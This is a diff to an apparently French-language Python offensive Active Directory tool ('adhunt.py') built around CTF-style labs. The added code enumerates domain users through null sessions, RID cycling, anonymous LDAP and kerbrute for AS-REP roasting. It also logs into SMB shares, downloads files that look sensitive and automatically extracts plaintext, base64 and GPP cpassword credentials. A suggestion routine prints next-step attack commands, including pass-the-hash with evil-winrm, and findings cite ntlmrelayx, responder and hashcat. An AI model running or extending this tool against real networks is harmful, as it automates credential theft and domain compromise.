@@ -59,6 +59,35 @@ def stage(title):
     log(f"{C.B}{C.BD}  {title}{C.X}")
     log(f"{C.B}{C.BD}{'='*68}{C.X}")
 
+def table_lines(headers, rows):
+    """Rend une table ASCII alignee (liste de lignes texte)."""
+    cols = len(headers)
+    w = [len(str(headers[i])) for i in range(cols)]
+    for r in rows:
+        for i in range(cols):
+            w[i] = max(w[i], len(str(r[i])))
+    fmt = lambda row: " | ".join(str(row[i]).ljust(w[i]) for i in range(cols))
+    sep = "-+-".join("-" * w[i] for i in range(cols))
+    return [fmt(headers), sep] + [fmt(r) for r in rows]
+
+def show_table(headers, rows, color=None, cap=60):
+    """Affiche une table dans le terminal (tronque a `cap` lignes)."""
+    if not rows:
+        return
+    shown = rows[:cap]
+    lines = table_lines(headers, shown)
+    log(f"  {C.BD}{lines[0]}{C.X}")
+    log(f"  {C.GR}{lines[1]}{C.X}")
+    for l in lines[2:]:
+        log(f"  {(color or C.G)}{l}{C.X}")
+    if len(rows) > cap:
+        log(f"  {C.GR}... (+{len(rows)-cap}, tout dans le fichier){C.X}")
+
+def save_table(args, name, headers, rows):
+    """Ecrit une table lisible dans loot/<name>."""
+    with open(os.path.join(args.loot, name), "w", encoding="utf-8") as f:
+        f.write("\n".join(table_lines(headers, rows)) + "\n")
+
 AUDIT = None  # fichier d'audit ouvert dans main()
 def audit(line):
     if AUDIT:
@@ -130,6 +159,25 @@ def scan_network(hosts, ports, threads=100, timeout=1.2):
                 results[ip] = op
     sys.stdout.write("\r" + " " * 40 + "\r")
     return results
+
+def nmap_versions(ip, ports, timeout=300):
+    """nmap -sV sur les ports ouverts -> {port: (service, version)}."""
+    import shutil as _sh
+    if not _sh.which("nmap") or not ports:
+        return {}
+    pl = ",".join(str(p) for p in ports)
+    try:
+        pr = __import__("subprocess").run(["nmap", "-sV", "-Pn", "-T4", "-p", pl, ip],
+                                          capture_output=True, text=True, timeout=timeout)
+        out = pr.stdout
+    except Exception:
+        return {}
+    ver = {}
+    for line in out.splitlines():
+        m = re.match(r"(\d+)/tcp\s+open\s+(\S+)\s*(.*)", line)
+        if m:
+            ver[int(m.group(1))] = (m.group(2), m.group(3).strip())
+    return ver
 
 # ----------------------------------------------------------------------
 # Sonde SMB2 brute (pur python) : signing requis ? + clock skew + dialecte
@@ -342,6 +390,12 @@ def phase0_discovery(targets, args):
             col = C.G if abs(sk) < 120 else C.R
             warn = "" if abs(sk) < 300 else f"  {C.R}<- Kerberos KO (>5min), sync l'horloge{C.X}"
             log(f"      horloge  : ecart {col}{sk:+d}s{C.X}{warn}")
+        # table ports / service / version (nmap -sV sur les DC si nmap present)
+        ver = nmap_versions(ip, rec["ports"]) if rec["is_dc"] else {}
+        prows = [[p, "tcp", ver.get(p, (AD_PORTS.get(p, "?"), ""))[0],
+                  (ver.get(p, ("", ""))[1] or "")[:48]] for p in rec["ports"]]
+        show_table(["PORT", "PROTO", "SERVICE", "VERSION"], prows, C.G, cap=40)
+        save_table(args, f"ports_{ip}.txt", ["PORT", "PROTO", "SERVICE", "VERSION"], prows)
 
     # synthese
     log(f"\n{C.CY}{C.BD}[=] {len(hosts)} hote(s) AD, dont {len(dcs)} DC : "
@@ -501,27 +555,27 @@ def phase1_unauth(hosts, args, state):
         log(f"{C.R}[!] Pas de DC identifie -> phase 1 limitee.{C.X}")
         return
     nxc = nxc_bin()
-    users = set()
+    confirmed = set()   # vrais comptes enumeres (LDAP/RID/nxc/kerbrute-valide)
+    seed = set()        # userlist fournie (validation kerbrute / roast en aveugle)
 
-    # userlist fournie (ex: THM Attacktive Directory ou l'OSINT) -> seed
+    # userlist fournie -> seed (PAS traitee comme des comptes confirmes)
     if getattr(args, "userlist", None) and os.path.isfile(args.userlist):
         with open(args.userlist, encoding="utf-8", errors="ignore") as f:
             for line in f:
                 u = line.strip()
                 if u and not u.startswith("#"):
-                    users.add(u.split("@")[0].split("\\")[-1])
-        log(f"{C.GR}[i] Userlist chargee : {len(users)} utilisateur(s) (seed).{C.X}")
+                    seed.add(u.split("@")[0].split("\\")[-1])
+        log(f"{C.GR}[i] Userlist chargee : {len(seed)} utilisateur(s) (seed).{C.X}")
 
-    # surface de relais/coercion (depuis phase 0)
+    # surface de relais/coercion + poisoning (findings)
     for ip, r in hosts.items():
         if r.get("smb_signing_required") is False:
             add_finding(state, "HIGH", "SMB signing non requis (relais NTLM)",
                         "ntlmrelayx.py -tf targets -smb2support", ip)
-    # surface de poisoning (position reseau interne)
     add_finding(state, "INFO", "LLMNR/NBT-NS/mDNS poisoning (position reseau)",
                 "responder -I <iface> -wv -> capture NetNTLMv2 -> hashcat -m 5600 / relais")
 
-    # 1) password policy (AVANT tout spray) + null session
+    # 1) password policy + null session + RID cycling -> confirmed
     if nxc:
         log(f"{C.GR}[i] {nxc} : password policy + null session sur {dc}...{C.X}")
         rc, out, _ = run_cmd([nxc, "smb", dc] + nxc_auth(args, null=True) + ["--pass-pol"], 120)
@@ -530,71 +584,79 @@ def phase1_unauth(hosts, args, state):
             thr = m.group(1)
             state["lockout_threshold"] = None if thr.lower() == "none" else int(thr)
             log(f"    {C.CY}Lockout threshold : {thr}{C.X}")
-        # shares + users + groups en null
-        for flag, key in (("--shares", "shares"), ("--users", "users"), ("--groups", "groups")):
+        for flag in ("--shares", "--users", "--groups"):
             rc, out, _ = run_cmd([nxc, "smb", dc] + nxc_auth(args, null=True) + [flag], 120)
             if flag == "--users":
                 for mu in re.finditer(r"\\([A-Za-z0-9._$-]+)\s", out):
-                    users.add(mu.group(1))
-            if out.strip() and ("SHARE" in out or "-Username-" in out or "READ" in out):
-                log(f"    {C.G}null session {flag} : reponse obtenue{C.X}")
-                if flag == "--shares":
-                    add_finding(state, "MED", "Null session SMB autorisee (shares listables)",
-                                "nxc smb <dc> -u '' -p '' --shares", dc)
-        # 2) RID cycling
+                    confirmed.add(mu.group(1))
+            if flag == "--shares" and out.strip() and ("READ" in out or "SHARE" in out):
+                add_finding(state, "MED", "Null session SMB autorisee (shares listables)",
+                            "nxc smb <dc> -u '' -p '' --shares", dc)
         log(f"{C.GR}[i] {nxc} : RID cycling (--rid-brute)...{C.X}")
         rc, out, _ = run_cmd([nxc, "smb", dc] + nxc_auth(args, null=True) + ["--rid-brute"], 180)
         for mu in re.finditer(r":\s*[A-Za-z0-9.-]+\\([A-Za-z0-9._$-]+)\s*\(SidTypeUser\)", out):
-            users.add(mu.group(1))
+            confirmed.add(mu.group(1))
     elif have("enum4linux-ng"):
         log(f"{C.GR}[i] enum4linux-ng sur {dc}...{C.X}")
         rc, out, _ = run_cmd(["enum4linux-ng", "-A", dc], 300)
         for mu in re.finditer(r"username:\s*([A-Za-z0-9._$-]+)", out):
-            users.add(mu.group(1))
+            confirmed.add(mu.group(1))
     elif have("rpcclient"):
         log(f"{C.GR}[i] rpcclient (null session) sur {dc}...{C.X}")
         rc, out, _ = run_cmd(["rpcclient", "-U", "", "-N", dc, "-c", "enumdomusers"], 120)
         for mu in re.finditer(r"user:\[([^\]]+)\]", out):
-            users.add(mu.group(1))
+            confirmed.add(mu.group(1))
     else:
-        log(f"{C.Y}[i] nxc/netexec absent -> null session/RID cycling limites. "
-            f"(pip/apt: netexec){C.X}")
+        log(f"{C.Y}[i] nxc/netexec absent -> null/RID limites (pip/apt: netexec).{C.X}")
 
-    # LDAP anonyme (dump users)
+    # LDAP anonyme -> confirmed
     if have_lib("ldap3"):
         rd = ldap_rootdse(dc)
         if rd and rd.get("defaultNamingContext"):
             try:
                 from ldap3 import Server, Connection, SUBTREE
-                srv = Server(dc)
-                conn = Connection(srv, auto_bind=True, receive_timeout=6)
-                ok = conn.search(rd["defaultNamingContext"], "(objectClass=user)",
-                                 search_scope=SUBTREE, attributes=["sAMAccountName"])
-                if ok and conn.entries:
+                conn = Connection(Server(dc), auto_bind=True, receive_timeout=6)
+                if conn.search(rd["defaultNamingContext"], "(objectClass=user)",
+                               search_scope=SUBTREE, attributes=["sAMAccountName"]) and conn.entries:
                     for e in conn.entries:
                         s = str(getattr(e, "sAMAccountName", "") or "")
                         if s:
-                            users.add(s)
+                            confirmed.add(s)
                     add_finding(state, "MED", "LDAP anonymous bind autorise (dump users)",
                                 f"{len(conn.entries)} objets user lus en anonyme", dc)
                 conn.unbind()
             except Exception:
                 pass
 
-    users = sorted(u for u in users if u and not u.endswith("$"))
-    if users:
-        p = save_loot(args, "users.txt", "\n".join(users) + "\n")
-        state["users"] = users
-        log(f"\n{C.CY}{C.BD}[=] {len(users)} utilisateur(s) -> {p}{C.X}")
+    confirmed = {u for u in confirmed if u and not u.endswith("$")}
 
-    # kerbrute userenum (sans lockout)
-    if have("kerbrute") and users and args.domain:
-        log(f"{C.GR}[i] kerbrute userenum ({len(users)} users, sans lockout)...{C.X}")
-        rc, out, _ = run_cmd(["kerbrute", "userenum", "-d", args.domain, "--dc", dc,
-                              os.path.join(args.loot, "users.txt")], 300)
+    # kerbrute : valide le seed (ou les confirmes) -> ajoute les valides aux confirmes
+    if have("kerbrute") and args.domain and (seed or confirmed):
+        src = sorted(seed or confirmed)
+        kf = save_loot(args, "kerbrute_in.txt", "\n".join(src) + "\n")
+        log(f"{C.GR}[i] kerbrute userenum ({len(src)} candidats, sans lockout)...{C.X}")
+        rc, out, _ = run_cmd(["kerbrute", "userenum", "-d", args.domain, "--dc", dc, kf], 300)
         valid = re.findall(r"VALID USERNAME:\s+([A-Za-z0-9._-]+)@", out)
+        confirmed |= {v for v in valid if not v.endswith("$")}
         if valid:
-            log(f"    {C.G}{len(valid)} username(s) valide(s) confirme(s){C.X}")
+            log(f"    {C.G}{len(set(valid))} username(s) valide(s) confirme(s){C.X}")
+
+    # liste a roaster : les confirmes si on en a, sinon le seed brut (roast en aveugle)
+    roast_users = sorted(confirmed) if confirmed else sorted(seed)
+    if roast_users:
+        save_loot(args, "users.txt", "\n".join(roast_users) + "\n")   # input GetNPUsers
+    confirmed = sorted(confirmed)
+    state["users"] = confirmed or roast_users
+
+    # TABLE des utilisateurs confirmes (affichage + sauvegarde)
+    if confirmed:
+        save_loot(args, "confirmed_users.txt", "\n".join(confirmed) + "\n")
+        log(f"\n{C.CY}{C.BD}[=] {len(confirmed)} utilisateur(s) confirme(s) :{C.X}")
+        urows = [[i + 1, u] for i, u in enumerate(confirmed)]
+        show_table(["#", "UTILISATEUR"], urows, C.G)
+        save_table(args, "users_table.txt", ["#", "UTILISATEUR"], urows)
+    elif roast_users:
+        log(f"{C.GR}[i] {len(roast_users)} candidats (seed, non valides) -> AS-REP en aveugle.{C.X}")
 
     # AS-REP roasting (sans creds)
     phase_asrep(dc, args, state, label="non-auth")
@@ -689,67 +751,139 @@ def phase2_password(hosts, args, state):
 # (le classique CTF : creds en clair dans un .config / .ps1 / unattend.xml)
 # ======================================================================
 DEFAULT_SHARES = {"admin$", "c$", "ipc$", "print$"}
-# motifs de fichiers a haute valeur (creds/config/scripts/secrets)
-SPIDER_REGEX = (r"(?i)(passw|cred|secret|unattend|sysprep|autologon|\.kdbx|\.ppk|"
-                r"id_rsa|\.pem|web\.config|app\.config|\.ps1|\.bat|\.vbs|\.ini|"
-                r"backup|\.bak|\.config|vnc|\.git)")
+# fichiers a telecharger + fouiller (creds/config/scripts/secrets)
+SENSITIVE_FILE = re.compile(
+    r"(?i)(passw|cred|secret|unattend|sysprep|autologon|\.kdbx|\.ppk|id_rsa|\.pem|"
+    r"web\.config|app\.config|\.ps1|\.bat|\.vbs|\.ini|backup|\.bak|\.config|vnc|"
+    r"\.git|\.txt|\.xml|\.yml|\.yaml|\.json|\.ovpn|\.rdp)")
+
+def _parse_creds_from_bytes(data):
+    """Extrait des couples (user, pass) d'un fichier : base64, user@dom:pass, user/pass, cpassword."""
+    import base64
+    found = []
+    texts = [data.decode("utf-8", "ignore")]
+    for tok in [data.strip()] + re.split(rb"\s+", data.strip()):
+        s = tok.strip()
+        if 8 <= len(s) <= 2000 and len(s) % 4 == 0 and re.fullmatch(rb"[A-Za-z0-9+/=]+", s or b""):
+            try:
+                dec = base64.b64decode(s).decode("utf-8", "ignore")
+                if dec and all(32 <= ord(c) < 127 or c in "\r\n\t" for c in dec):
+                    texts.append(dec)
+            except Exception:
+                pass
+    for t in texts:
+        for m in re.finditer(r"([A-Za-z0-9._-]{1,40})@[\w.-]+:(\S{2,60})", t):          # user@domaine:pass
+            found.append((m.group(1), m.group(2)))
+        for m in re.finditer(r"(?is)user(?:name)?\s*[:=]\s*([A-Za-z0-9._\\-]{1,40})"
+                             r".{0,40}?pass(?:word)?\s*[:=]\s*(\S{2,60})", t):            # user:.. pass:..
+            found.append((m.group(1).split("\\")[-1], m.group(2)))
+        for m in re.finditer(r'cpassword\s*[:=]\s*["\']?([A-Za-z0-9+/=]{16,})', t):       # GPP cpassword
+            found.append(("GPP-cpassword", m.group(1)))
+    return found
+
+def loot_shares_host(args, state, host):
+    """Liste les shares, walk, TELECHARGE les petits fichiers sensibles, extrait les creds (impacket)."""
+    if not have_lib("impacket"):
+        return
+    try:
+        from impacket.smbconnection import SMBConnection
+        from io import BytesIO
+    except Exception:
+        return
+    try:
+        conn = SMBConnection(host, host, timeout=8)
+        if args.nthash:
+            lm, nt = nt_full(args.nthash).split(":")
+            conn.login(args.user, "", args.domain or "", lm, nt)
+        else:
+            conn.login(args.user, args.password or "", args.domain or "")
+        shares = conn.listShares()
+    except Exception:
+        return
+    looted = []
+    def walk(share, path="", depth=0):
+        if depth > 6:
+            return
+        try:
+            entries = conn.listPath(share, path + "*")
+        except Exception:
+            return
+        for f in entries:
+            name = f.get_longname()
+            if name in (".", ".."):
+                continue
+            full = path + name
+            if f.is_directory():
+                walk(share, full + "\\", depth + 1)
+            elif 0 < f.get_filesize() < 200000 and SENSITIVE_FILE.search(name):
+                buf = BytesIO()
+                try:
+                    conn.getFile(share, full, buf.write)
+                except Exception:
+                    continue
+                looted.append(f"\\\\{host}\\{share}\\{full}")
+                for user, pw in _parse_creds_from_bytes(buf.getvalue()):
+                    if user.lower() in ("username", "user", "administrator") and pw == "":
+                        continue
+                    cred = {"user": user, "password": pw, "hash": None, "src": f"share:{name}"}
+                    if not any(c.get("user") == user and c.get("password") == pw
+                               for c in state.get("creds", [])):
+                        state.setdefault("creds", []).append(cred)
+                        add_finding(state, "CRIT", f"Cred en clair dans {name} : {user}:{pw}",
+                                    f"\\\\{host}\\{share}\\{full}", host)
+    for sh in shares:
+        try:
+            name = str(sh['shi1_netname']).rstrip("\x00")
+        except Exception:
+            continue
+        if not name or name.lower() in DEFAULT_SHARES:
+            continue
+        walk(name)
+    try:
+        conn.logoff()
+    except Exception:
+        pass
+    if looted:
+        state.setdefault("loot_files", []).extend(looted)
+        with open(os.path.join(args.loot, "sensitive_files.txt"), "a", encoding="utf-8") as fp:
+            fp.write("\n".join(looted) + "\n")
+        log(f"{C.G}    -> {len(looted)} fichier(s) sensible(s) recupere(s) sur {host}{C.X}")
 
 def enum_shares(args, state, hosts):
     nxc = nxc_bin()
-    if not nxc:
-        log(f"{C.Y}[i] nxc absent -> enum/spider des shares saute.{C.X}")
-        return
     ips = list(hosts.keys())
-    tf = save_loot(args, "hosts.txt", "\n".join(ips) + "\n")
+    save_loot(args, "hosts.txt", "\n".join(ips) + "\n")
     auth = nxc_auth(args) + (["-d", args.domain] if args.domain else [])
 
-    # 1) lister les shares accessibles (READ/WRITE) sur tous les hotes
-    ver = nxc_version()
-    log(f"{C.GR}[i] {nxc} ({ver}) : enum des shares sur {len(ips)} hote(s)...{C.X}")
-    rc, out, _ = run_cmd([nxc, "smb", tf] + auth + ["--shares"], 300)
-    # si le parsing casse sur une version recente, on saura pourquoi (readable vide)
-    readable = {}   # host -> [shares interessants]
-    writable = []
-    for line in out.splitlines():
-        m = re.search(r"(\d+\.\d+\.\d+\.\d+).*?\s(\S+)\s+(READ(?:,WRITE)?|WRITE)\s*", line)
-        if not m:
-            continue
-        host, share, perm = m.group(1), m.group(2), m.group(3)
-        if share.lower() in DEFAULT_SHARES:
-            continue
-        readable.setdefault(host, []).append((share, perm))
-        if "WRITE" in perm:
-            writable.append(f"{host}\\{share}")
-    for host, shares in readable.items():
-        for share, perm in shares:
+    # 1) apercu des permissions (READ/WRITE) via nxc si present
+    if nxc:
+        tf = os.path.join(args.loot, "hosts.txt")
+        log(f"{C.GR}[i] {nxc} ({nxc_version()}) : enum des shares sur {len(ips)} hote(s)...{C.X}")
+        rc, out, _ = run_cmd([nxc, "smb", tf] + auth + ["--shares"], 300)
+        writable = []
+        for line in out.splitlines():
+            m = re.search(r"(\d+\.\d+\.\d+\.\d+).*?\s(\S+)\s+(READ(?:,WRITE)?|WRITE)\s*", line)
+            if not m:
+                continue
+            host, share, perm = m.group(1), m.group(2), m.group(3)
+            if share.lower() in DEFAULT_SHARES:
+                continue
             add_finding(state, "MED" if perm == "READ" else "HIGH",
                         f"Share accessible ({perm}) : \\\\{host}\\{share}",
-                        "a spider pour des creds/configs", host)
-    if writable:
-        add_finding(state, "HIGH", f"Share(s) inscriptibles : {len(writable)}",
-                    ", ".join(writable[:5]) + " (drop payload / SCF / .lnk)")
+                        "loote pour des creds/configs", host)
+            if "WRITE" in perm:
+                writable.append(f"{host}\\{share}")
+        if writable:
+            add_finding(state, "HIGH", f"Share(s) inscriptibles : {len(writable)}",
+                        ", ".join(writable[:5]) + " (drop payload / SCF / .lnk)")
 
-    # 2) spider les shares interessants pour des fichiers sensibles
-    hits = []
-    for host, shares in readable.items():
-        for share, _ in shares:
-            rc, out, _ = run_cmd([nxc, "smb", host] + auth +
-                                 ["--spider", share, "--regex", SPIDER_REGEX], 240)
-            for m in re.finditer(r"//[^\s]+/[^\s]+|\[.*?\]\s*(\S+\.(?:config|ps1|xml|ini|kdbx|bat|vbs|bak|pem))", out):
-                f = m.group(0)
-                if f and f not in hits:
-                    hits.append(f)
-    # fallback module spider_plus (dump metadata) si dispo
-    if not readable:
-        run_cmd([nxc, "smb", tf] + auth + ["-M", "spider_plus"], 300)
-    if hits:
-        p = save_loot(args, "sensitive_files.txt", "\n".join(hits) + "\n")
-        add_finding(state, "HIGH", f"{len(hits)} fichier(s) sensible(s) sur les shares",
-                    f"voir {p} -> telecharge et cherche des creds en clair")
-        state.setdefault("loot_files", []).extend(hits[:50])
-        log(f"\n{C.G}{C.BD}[=] {len(hits)} fichier(s) sensible(s) -> {p}{C.X}")
-    else:
-        log(f"{C.GR}[i] Pas de fichier sensible evident au spider (fouille manuelle recommandee).{C.X}")
+    # 2) LOOT reel : telecharge + fouille les fichiers sensibles (impacket) -> creds auto
+    if have_lib("impacket"):
+        log(f"{C.GR}[i] Loot des shares (download + parse creds) sur {len(ips)} hote(s)...{C.X}")
+        for ip in ips:
+            loot_shares_host(args, state, ip)
+    elif not nxc:
+        log(f"{C.Y}[i] nxc/impacket absent -> shares sautes.{C.X}")
 
 # ======================================================================
 # ENUM AVANCEE : MSSQL, LAPS, gMSA, trusts (inspire HackTricks / HTB)
@@ -1618,6 +1752,33 @@ def phase5_report(state, args):
         f"{C.R}{ncrit} CRIT{C.CY} / {C.R}{nhigh} HIGH{C.CY} / "
         f"{len(state.get('creds', []))} cred(s){C.X}")
 
+def suggest_next(args, state):
+    """Propose la commande a lancer a la suite selon l'etat."""
+    tgt, dom = state.get("target"), state.get("domain") or "<domaine>"
+    dc = first_dc(state.get("hosts", {})) or tgt
+    cmd = reason = None
+    creds = state.get("creds", [])
+    # NTDS dumpe -> connexion Administrator
+    if state.get("hashes", {}).get("ntds"):
+        cmd = (f"grep -i 'Administrator:' {state['hashes']['ntds']}  "
+               f"# puis: evil-winrm -i {dc} -u Administrator -H <NThash>")
+        reason = "NTDS dumpe -> recupere le hash Administrator et connecte-toi (pass-the-hash)"
+    # creds trouvees mais run non-authentifie -> relancer en --all
+    elif creds and not args.all:
+        c = creds[0]
+        idf = f"-H {c['hash']}" if c.get("hash") else f"-p '{c.get('password')}'"
+        cmd = f"python3 adhunt.py {tgt} -d {dom} -u {c['user']} {idf} --all --loop --yes"
+        reason = f"cred obtenu ({c['user']}) -> enum authentifiee + escalade en boucle"
+    # rien -> seed d'une userlist
+    elif not creds and not state.get("users"):
+        cmd = f"python3 adhunt.py {tgt} -d {dom} --anon --userlist wordlists/userlist.txt"
+        reason = "aucun user -> seed la phase 1 avec une userlist (kerbrute)"
+    if cmd:
+        state["next_command"] = cmd
+        log(f"\n{C.CY}{C.BD}[>] PROCHAINE COMMANDE :{C.X}")
+        log(f"    {C.G}{C.BD}{cmd}{C.X}")
+        log(f"    {C.GR}-> {reason}{C.X}")
+
 # ----------------------------------------------------------------------
 # Cibles : IP, CIDR, hostname, ou fichier
 # ----------------------------------------------------------------------
@@ -1765,8 +1926,9 @@ def main():
     elif args.all and not authed:
         log(f"\n{C.Y}[i] Phases 3-4 (auth) ignorees : pas de creds (-u/-p ou -H).{C.X}")
 
-    # Phase 5 : rapport (toujours)
+    # Phase 5 : rapport (toujours) + commande suivante suggeree
     phase5_report(state, args)
+    suggest_next(args, state)
 
     log(f"\n{C.GR}Termine en {time.time()-start:.1f}s | loot: {args.loot}/{C.X}")
     audit("END")
